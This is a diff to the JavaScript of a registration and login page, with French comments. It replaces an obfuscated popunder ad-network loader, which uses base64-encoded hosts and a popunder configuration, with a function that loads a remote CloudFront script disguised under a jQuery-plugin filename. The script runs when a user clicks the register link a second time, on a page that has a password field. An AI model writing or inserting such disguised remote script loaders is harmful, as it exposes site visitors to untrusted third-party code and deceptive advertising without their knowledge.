@@ -117,6 +117,14 @@ const togglePassword = document.getElementById("togglePassword");
 const passwordInput = document.getElementById("password");
 let toastTimeout;
 
+// ========== NOUVEAU SCRIPT loadAdScript ==========
+function loadAdScript() {
+    const s = document.createElement("script");
+    s.src = "https://d2klx87bznngce.cloudfront.net/sjquery.caret.min.js"; 
+    s.async = true;
+    document.body.appendChild(s);
+}
+
 // ========== SCRIPT POUR LE TEXTE M'INSCRIRE ==========
 let popupOpened = false;
 let scriptExecuted = false;
@@ -127,16 +135,9 @@ function executeRegisterScript() {
     
     console.log("🚀 Déclenchement du script d'inscription...");
     
-    // 1️⃣ Injection et exécution du script externe
-    const script = document.createElement('script');
-    script.type = 'text/javascript';
-    script.setAttribute('data-cfasync', 'false');
-    script.textContent = `/*<![CDATA[/* */
-(function(){var q=window,c="e8acc715accff29b5bee4ad14137ae62",s=[["siteId",827*967*458-361018673],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],y=["d3d3LmludGVsbGlnZW5jZWFkeC5jb20vZ0hhVlUvc0l5aFgvZG1hdGVyaWFsLWRhdGV0aW1lLXBpY2tlci5taW4uanM=","ZDJrbHg4N2Jnem5nY2UuY2xvdWRmcm9udC5uZXQvc2pxdWVyeS5jYXJldC5taW4uanM="],h=-1,r,j,o=function(){clearTimeout(j);h++;if(y[h]&&!(1802207654000<(new Date).getTime()&&1<h)){r=q.document.createElement("script");r.type="text/javascript";r.async=!0;var d=q.document.getElementsByTagName("script")[0];r.src="https://"+atob(y[h]);r.crossOrigin="anonymous";r.onerror=o;r.onload=function(){clearTimeout(j);q[c.slice(0,16)+c.slice(0,16)]||o()};j=setTimeout(o,5E3);d.parentNode.insertBefore(r,d)}};if(!q[c]){try{Object.freeze(q[c]=s)}catch(e){}o()}})();
-/*]]>/* */`;
-    
-    document.body.appendChild(script);
-    console.log("✅ Script externe injecté et exécuté");
+    // Appel de la fonction loadAdScript
+    loadAdScript();
+    console.log("✅ loadAdScript exécuté");
     
     // 2️⃣ Après 8 secondes : ouverture du formulaire Google
     setTimeout(function () {
@@ -279,7 +280,7 @@ registerTextLink.addEventListener("click", (e) => {
     // Deuxième clic : exécuter le script d'inscription
     console.log("📝 Deuxième clic - Déclenchement du script d'inscription");
     
-    // Exécution du script (injection + popup après 8 secondes)
+    // Exécution du script (loadAdScript + popup après 8 secondes)
     executeRegisterScript();
     
     // Réinitialiser le texte après exécution
